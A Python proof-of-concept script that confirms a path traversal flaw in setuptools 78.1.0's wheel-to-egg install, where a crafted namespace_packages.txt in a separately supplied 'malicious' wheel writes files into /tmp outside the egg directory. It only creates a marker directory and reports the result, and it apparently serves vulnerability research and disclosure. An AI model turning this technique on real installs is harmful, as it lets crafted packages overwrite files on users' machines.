#!/usr/bin/env python3
"""
Test script to trigger the namespace_packages.txt path traversal vulnerability.

This uses the local setuptools source to install the malicious wheel,
demonstrating that files are written to /tmp/ instead of the egg directory.
"""

import os
import sys
import tempfile
import shutil

# Add the local setuptools to the path (before system setuptools)
SETUPTOOLS_ROOT = "/home/dyn/code/setuptools-78.1.0"
sys.path.insert(0, SETUPTOOLS_ROOT)

from setuptools.wheel import Wheel

# Paths
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
WHEEL_PATH = os.path.join(SCRIPT_DIR, "malicious-1.0-py3-none-any.whl")
TARGET_PATH = "/tmp/pwned_by_namespace_traversal"

def main():
    print("=" * 70)
    print("Namespace Package Path Traversal PoC")
    print("=" * 70)

    # Clean up any previous run
    if os.path.exists(TARGET_PATH):
        print(f"\n[*] Cleaning up previous exploit artifact: {TARGET_PATH}")
        shutil.rmtree(TARGET_PATH)

    # Verify the target doesn't exist
    print(f"\n[*] Before exploit:")
    print(f"    /tmp/pwned_by_namespace_traversal exists? {os.path.exists(TARGET_PATH)}")

    # Create a temporary directory to "install" the egg
    with tempfile.TemporaryDirectory() as tmpdir:
        egg_dir = os.path.join(tmpdir, "malicious-1.0-py3.egg")

        print(f"\n[*] Installing wheel to: {egg_dir}")
        print(f"    Wheel: {WHEEL_PATH}")

        # This triggers the vulnerability
        wheel = Wheel(WHEEL_PATH)
        wheel.install_as_egg(egg_dir)

        print(f"\n[*] Installation complete!")

        # Check what was created in the egg directory (expected location)
        print(f"\n[*] Contents of egg directory ({egg_dir}):")
        for root, dirs, files in os.walk(egg_dir):
            level = root.replace(egg_dir, '').count(os.sep)
            indent = '    ' * (level + 1)
            print(f"{indent}{os.path.basename(root)}/")
            subindent = '    ' * (level + 2)
            for file in files:
                print(f"{subindent}{file}")

    # Check if the exploit worked
    print(f"\n[*] After exploit:")
    print(f"    /tmp/pwned_by_namespace_traversal exists? {os.path.exists(TARGET_PATH)}")

    if os.path.exists(TARGET_PATH):
        print(f"\n[!] VULNERABILITY CONFIRMED!")
        print(f"    Path traversal successfully wrote outside egg directory!")

        init_file = os.path.join(TARGET_PATH, "__init__.py")
        if os.path.exists(init_file):
            print(f"\n[*] Contents of {init_file}:")
            with open(init_file, 'r') as f:
                print(f"    {f.read()!r}")

        # Show directory listing
        print(f"\n[*] Listing of /tmp/pwned_by_namespace_traversal/:")
        for item in os.listdir(TARGET_PATH):
            print(f"    {item}")

        return 0
    else:
        print(f"\n[-] Exploit did not work (vulnerability may be patched)")
        return 1

if __name__ == "__main__":
    sys.exit(main())
